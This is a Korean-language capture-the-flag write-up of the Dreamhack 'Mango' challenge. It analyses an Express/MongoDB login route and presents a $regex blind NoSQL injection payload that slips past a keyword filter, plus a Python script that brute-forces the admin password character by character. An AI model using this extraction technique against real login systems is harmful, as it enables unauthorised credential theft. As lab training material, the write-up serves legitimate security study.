# Mango

### Overview

[Link (Mango)](https://dreamhack.io/wargame/challenges/90)

**Environment**
```
Language: Javascript
Framework: ExpressJS
Database: MongoDB
```


1. Code Analysis<a href="#1-code-analysis"><sup>[1]</sup></a>
    - main.js
        - Hint
        - `BAN`
        - `filter`
        - `/login`
        - `/`

2. Vulnerability<a href="#2-vunerability"><sup>[2]</sup></a>

    - Blind NoSQL Injection

3. Scenario<a href="#3-scenario"><sup>[3]</sup></a>

4. Payload<a href="#4-payload"><sup>[4]</sup></a>

5. Exploit<a href="#5-exploit"><sup>[5]</sup></a>

6. Conclusion<a href="#5-conclusion"><sup>[6]</sup></a>

---

### 1. Code Analysis

- main.js

    - Hint
    ```
    // flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}
    ```
    `Flag`의 위치를 알려주고 있으며, `upw`의 형태 및 조건을 알려주고 있다.

    <br/>

    - `BAN`
    ```js
    const BAN = ['admin', 'dh', 'admi'];
    ```
    이후 `filter`에 사용될 문자열들로, 개인적으로 이 부분에서도 약간의 힌트가 있었다고 생각하였다.  
    `admin`뿐만 아니라 `admi`까지 따로 제시된 것을 보고 정규표현식을 떠올렸다.

    </br>
    
    - `filter`
    ```js
    filter = function(data){
        const dump = JSON.stringify(data).toLowerCase();
        var flag = false;
        BAN.forEach(function(word){
            if(dump.indexOf(word)!=-1) flag = true;
        });
        return flag;
    }
    ```
    파라미터로 전달받은 `data`를 소문자로 변환하고, `BAN` 배열을 확인하여 해당하는 문자열이 있다면 `true`를, 아니라면 `false`를 반환한다.

    <br/>

    - `/login`
    ```js
    app.get('/login', function(req, res) {
        if(filter(req.query)){
            res.send('filter');
            return;
        }
        const {uid, upw} = req.query;

        db.collection('user').findOne({
            'uid': uid,
            'upw': upw,
        }, function(err, result){
            if (err){
                res.send('err');
            }else if(result){
                res.send(result['uid']);
            }else{
                res.send('undefined');
            }
        })
    });
    ```
    `req`로 받은 파라미터를 `filter` 함수를 적용하여 `true`일 경우 화면에 `filter`를 출력하고 동작을 마친다.  
    그렇지 않은 경우 `uid`와 `upw`에 받은 파라미터값을 입력한다.  
    이후 Database `user`에서 변수 `uid`와 `upw`가 DB 내 `uid`, `upw`에 해당하는 값을 하나 찾는다.  
    오류 발생 시 `err`를 출력하고, 결과값이 나온 경우 해당 값의 `uid`를 출력한다.  
    이외의 경우 `undefined`를 출력하여 동작을 종료한다.
    
    </br>
    
    - `/`
    ```js
    app.get('/', function(req, res) {
        res.send('/login?uid=guest&upw=guest');
    });
    ```
    `/login?uid=guest&upw=guest`를 출력한다.  
    `login`페이지의 존재 여부와 해당 페이지로 전달되는 파라미터를 알려주는 페이지이다.  
    해당 값을 URL에 입력하면 쿼리 결과값의 `uid` 부분인 `guest`가 출력된다.

---

### 2. Vunerability
- Blind NoSQL Injection:  
    동적 쿼리를 생성하며, 타입 체크 및 쿼리에 대한 검증이 따로 없다. 필터가 존재하나 약한 필터라 평가된다.
    쿼리에 대한 응답이 아닌, 쿼리에 해당하는 `uid`를 출력해주기에 Blind NoSQL Injection을 이용해 `upw`를 찾아야한다.

---

### 3. Scenario

1. 가용한 정보는 `flag`의 위치, 해당하는 `uid` 문자열과 `upw`의 형태 및 조건, `filter`에 의해 걸러지는 문자열이 있다.

2. 확인된 취약점은 `NoSQL Injection`이다.

3. 공격자 입장에서는 쿼리에 알맞은 질의가 이루어졌는지 확인하는 것만 가능하다.

4. 정규표현식을 이용해 `admin`과 관련한 Payload를 전달하여 `admin`이 출력되는지 확인한다.

5. 이후 Blind SQL Injection처럼 쿼리 반환값을 이용, Brute Force Attack을 수행하여 `Flag`인 `upw`를 알아낸다.

---

### 4. Payload

```
/login?uid[$regex]=ad.in&upw[$regex]=D*
```
`uid`와 `upw` 파라미터를 MongoDB에서 사용되는 정규표현식으로 전달한다.  
전달한 값으로 `uid`는 `admin`의 `m` 자리에 임의의 문자 한개가 포함되는 값, `upw`는 `DH{*}`에서 `D` 이후 임의의 문자열이 추가된 값이다.  
해당 값을 입력하면 `admin`이 출력된다.

---

### 5. Exploit

1. exploit.py
```python
import requests
import string

HOST = input("Host: ")
ALPHANUMERIC = string.digits + string.ascii_letters
SUCCESS = 'admin'

flag = ''
for i in range(32):
    for ch in ALPHANUMERIC:
        response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}')
        if response.text == SUCCESS:
            flag += ch
            break
    print(f'FLAG: DH{{{flag}}}')
```
`HOST`에 호스트 주소를 입력받는다.  
`upw`에 포함될 수 있는 문자를 `ALPHANUMERIC`에 저장한다.  
익스플로잇에 성공하면 `admin`이 출력되기에 `SUCCESS`에 해당 문자열을 저장한다.  
`flag`를 문자열로 정의하고, 이후 Brute Force Attack에 의해 생성되는 문자열을 저장한다.  
`Flag` 문자열이 32자임을 알고 있으므로 32번의 문자 대조를 실시한다.  
`ALPHANUMERIC`의 문자를 하나씩 `upw` 파라미터에 넣어 정규표현식에 맞는 질의인지 확인하고 `flag`에 문자를 추가해준다.  
동작이 모두 완료되면 `FLAG`값을 알 수 있다.

2. index
![index](/Wargame/Mango/img/index.png)

3. login - guest
![login - guest](/Wargame/Mango/img/login%20-%20guest.png)

4. login - admin(Regular Expression)
![login - admin](/Wargame/Mango/img/login%20-%20admin.png)

5. Execute exploit.py
![exploit](/Wargame/Mango/img/exploit.png)

---

### 6. Conclusion
Dreamhack에서 제공하는 Blind SQL Injection Exploit Code를 접하기 전, 문제에 관해 찾아보고 작성한 코드라 효율성이 상당히 떨어진다.  
ASCII Code로 변환 후 Binary Search를 이용하여 Refactoring이 가능하다.  
시간 복잡도: $O(N)$ -> $O(logN)$  
exploit.py의 시간복잡도는  
(`ALPHANUMERIC`의 개수) x (`upw`의 길이) = $62 * 32 = 1984$  
Refactoring을 거치면  
(log(`ALPHANUMERIC`의 개수)) x (`upw`의 길이) $\approx 6 * 32 = 192$  
시간복잡도가 10배 이상 줄어든 것을 확인 할 수 있다.

---

[_Go to top_ ↑](#mango)